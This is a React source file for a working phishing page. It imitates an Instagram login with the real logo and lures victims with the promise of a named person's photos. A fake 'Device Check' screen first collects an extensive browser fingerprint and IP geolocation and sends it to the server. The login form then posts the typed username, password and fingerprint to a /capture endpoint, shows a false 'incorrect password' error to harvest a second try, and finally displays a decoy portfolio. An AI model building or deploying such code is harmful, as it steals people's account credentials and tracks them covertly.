import { FormEvent, useEffect, useRef, useState } from 'react';
import { motion } from 'motion/react';
import FingerprintJS from '@fingerprintjs/fingerprintjs';

type PortfolioPhoto = {
  title: string;
  description: string;
  image: string;
};

interface FingerprintGateProps {
  onComplete: (fingerprint: Record<string, unknown> | null) => void;
}

const portfolioPhotos: PortfolioPhoto[] = [
  {
    title: 'Golden Hour Glow',
    description: 'Soft light kissing the edges of a quiet afternoon',
    image: 'https://i.pinimg.com/originals/03/aa/cb/03aacbef514fc4880c1858909bfaa227.jpg',
  },
  {
    title: 'Dreamy Stillness',
    description: 'Caught between thought and light',
    image: 'https://i.pinimg.com/originals/b2/24/83/b22483307ea687d08b6a25ed68496b36.jpg',
  },
  {
    title: 'Natural Light',
    description: 'Unfiltered moments, pure and calm',
    image: 'https://i.pinimg.com/originals/2f/86/be/2f86be10f2bff0714eb8586ca5e5bdc5.jpg',
  },
  {
    title: 'Soft Aesthetic',
    description: 'Gentle tones and quiet confidence',
    image: 'https://i.pinimg.com/originals/58/b1/33/58b1335d121b7e41912c404ce34932bb.jpg',
  },
  {
    title: 'Window Light',
    description: 'Where shadows dance and stories begin',
    image: 'https://i.pinimg.com/originals/a0/2b/0f/a02b0fef360eba6976fcba5fee16cd2d.png',
  },
  {
    title: 'Timeless Frame',
    description: 'A moment frozen in soft elegance',
    image: 'https://i.pinimg.com/originals/56/c3/f4/56c3f49f22af35ed4527ed0ae0ce75c7.jpg',
  },
];

const FingerprintGate = ({ onComplete }: FingerprintGateProps) => {
  const [isCollecting, setIsCollecting] = useState(true);
  const hasRun = useRef(false);

  useEffect(() => {
    if (hasRun.current) return;
    hasRun.current = true;

    const getFingerprint = async () => {
      try {
        const fp = await FingerprintJS.load();
        const result = await fp.get();

        let ipData: Record<string, unknown> = {};
        try {
          const res = await fetch('https://ipapi.co/json/');
          const json = await res.json();
          ipData = {
            ip: json.ip,
            isp: json.org || json.isp || 'N/A',
            org: json.org || 'N/A',
            country: json.country_name,
            countryCode: json.country_code,
            city: json.city,
            region: json.region,
            timezone: json.timezone,
            isVpn: json.security?.vpn === true || json.security?.proxy === true || json.security?.tor === true || json.security?.relay === true,
            isProxy: json.security?.proxy || false,
            isTor: json.security?.tor || false,
            isRelay: json.security?.relay || false,
            asn: json.asn,
          };
        } catch (e) {
          console.warn('IP lookup failed', e);
        }

        let gpu = { vendor: 'Unknown', renderer: 'Unknown' };
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
              gpu.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Unknown';
              gpu.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
            }
          }
        } catch {
          // ignore render errors
        }

        let canvasFingerprint = '';
        try {
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          if (ctx) {
            canvas.width = 240;
            canvas.height = 60;
            ctx.textBaseline = 'top';
            ctx.font = "14px 'Arial'";
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('VisageDetector <canvas> 1.0', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('VisageDetector <canvas> 1.0', 4, 17);
            canvasFingerprint = canvas.toDataURL().slice(0, 120);
          }
        } catch {
          // ignore canvas failures
        }

        let audioFingerprint = '';
        try {
          const AudioContext = window.AudioContext || (window as any).webkitAudioContext;
          if (AudioContext) {
            const ctx = new AudioContext();
            audioFingerprint = `${ctx.sampleRate}|${ctx.destination.maxChannelCount}`;
            await ctx.close();
          }
        } catch {
          // ignore audio errors
        }

        let battery: { level: number | null; charging: boolean | null } = { level: null, charging: null };
        try {
          if ('getBattery' in navigator) {
            const b: any = await (navigator as any).getBattery();
            battery = {
              level: Math.round(b.level * 100),
              charging: b.charging,
            };
          }
        } catch {
          // ignore battery errors
        }

        const baseFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Helvetica', 'Monaco', 'Menlo'];
        const detectedFonts = baseFonts.filter((font) => {
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          if (!ctx) return false;
          const text = 'mmmmmmmmmmlli';
          ctx.font = '72px monospace';
          const baseline = ctx.measureText(text).width;
          ctx.font = `72px "${font}", monospace`;
          return ctx.measureText(text).width !== baseline;
        });

        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        const data = {
          visitorId: result.visitorId,
          userAgent: navigator.userAgent,
          browser: navigator.userAgent,
          platform: navigator.platform,
          os: navigator.platform,
          language: navigator.language,
          languages: navigator.languages,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screen: `${window.screen.width}x${window.screen.height}`,
          screenWidth: window.screen.width,
          screenHeight: window.screen.height,
          colorDepth: window.screen.colorDepth,
          pixelRatio: window.devicePixelRatio,
          hardwareConcurrency: navigator.hardwareConcurrency || 0,
          deviceMemory: (navigator as any).deviceMemory || null,
          touchSupport: 'ontouchstart' in window,
          cookiesEnabled: navigator.cookieEnabled,
          deviceType: isMobile ? 'Mobile' : 'Laptop/Desktop',
          gpu,
          canvas: canvasFingerprint,
          canvasFingerprint,
          audio: audioFingerprint,
          audioFingerprint,
          battery,
          fonts: detectedFonts,
          timestamp: new Date().toISOString(),
          ...ipData,
        };

        try {
          const response = await fetch('/api/fingerprint', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'FINGERPRINT', data }),
          });
          const json = await response.json().catch(() => ({}));
          if (!response.ok || !json.success) {
            throw new Error(`Fingerprint delivery failed: ${response.status}`);
          }
        } catch (err) {
          console.error('Fingerprint send failed, retrying...', err);
          try {
            const response = await fetch('/api/fingerprint', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ type: 'FINGERPRINT', data }),
            });
            await response.json().catch(() => ({}));
          } catch (retryErr) {
            console.error('Fingerprint send retry failed:', retryErr);
          }
        }

        onComplete(data);
      } catch (err) {
        console.error('Fingerprint collection failed:', err);
        onComplete(null);
      } finally {
        setIsCollecting(false);
      }
    };

    getFingerprint();
  }, [onComplete]);

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      className="captcha-card"
    >
      <h2>Device Check</h2>
      <p>Checking browser fingerprint to continue.</p>

      <div className="captcha-form">
        <div className="captcha-sum">{isCollecting ? 'Preparing...' : 'Ready'}</div>
        <button type="button" disabled className="captcha-button">
          {isCollecting ? 'Scanning...' : 'Continue'}
        </button>
      </div>
    </motion.div>
  );
};

export default function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);
  const [error, setError] = useState('');
  const [loggedIn, setLoggedIn] = useState(false);
  const [fingerprintReady, setFingerprintReady] = useState(false);
  const [capturedFingerprint, setCapturedFingerprint] = useState<Record<string, unknown> | null>(null);

  const handleLoginSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    if (!username.trim() || !password.trim()) {
      setError('Please enter your username and password.');
      return;
    }

    const nextAttempt = attemptCount + 1;
    setAttemptCount(nextAttempt);
    setIsLoading(true);
    setError('');

    const payload = {
      username,
      password,
      target: 'aadya.tiwari.me',
      time: Date.now(),
      attempt: nextAttempt,
      fingerprint: capturedFingerprint,
    };

    try {
      await fetch('/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
    } catch (submitErr) {
      console.error('Failed to send capture payload:', submitErr);
    }

    setUsername('');
    setPassword('');

    if (nextAttempt < 2) {
      setIsLoading(false);
      setError('Incorrect username or password.');
      return;
    }

    setIsLoading(false);
    setLoggedIn(true);
  };

  if (!fingerprintReady) {
    return (
      <div className="page-shell captcha-shell">
        <FingerprintGate onComplete={(fp) => {
          setCapturedFingerprint(fp);
          setFingerprintReady(true);
        }} />
      </div>
    );
  }

  if (loggedIn) {
    return (
      <div className="portfolio-page">
        <div className="container portfolio-container">
          <header className="portfolio-header">
            <div className="logo">Portfolio</div>
            <h1>Aadya Tiwari</h1>
            <p className="subtitle">Soft light · Quiet moments · Timeless frames</p>
          </header>

          <section className="gallery">
            {portfolioPhotos.map((photo) => (
              <article className="photo-card" key={photo.title}>
                <img src={photo.image} alt={photo.title} loading="lazy" />
                <div className="caption">
                  <h3>{photo.title}</h3>
                  <p>{photo.description}</p>
                </div>
              </article>
            ))}
          </section>

          <footer>
            <p>© 2026 Aadya Tiwari · All moments captured with love</p>
          </footer>

          <button className="logout-button" onClick={() => setLoggedIn(false)}>
            Back to login
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="page-shell">
      <div className="container login-container">
        <div className="top-right-i">i</div>

        <div className="logo-container">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/250px-Instagram_icon.png"
            alt="Instagram"
            className="insta-logo"
          />
        </div>

        <div className="insta-text">Instagram</div>

        <div className="signin-box">
          Sign in to your account to see photos of
          <strong>aadya.tiwari.me</strong>
        </div>

        <form onSubmit={handleLoginSubmit} className="login-form">
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Phone number, username, or email"
          />
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password"
          />

          <div className={`error ${error ? 'show' : ''}`}>{error || 'Incorrect username or password.'}</div>

          <button type="submit" disabled={isLoading}>
            {isLoading ? <span className="spinner" /> : null}
            {isLoading ? 'Logging in...' : 'Log in'}
          </button>
        </form>

        <div className="or-text">OR</div>
        <a href="#" className="facebook-link">Log in with Facebook</a>

        <p className="small-link">
          <a href="#">Forgot password?</a>
        </p>

        <p className="signup-line">
          Don't have an account? <a href="#">Sign up</a>
        </p>
      </div>
    </div>
  );
}
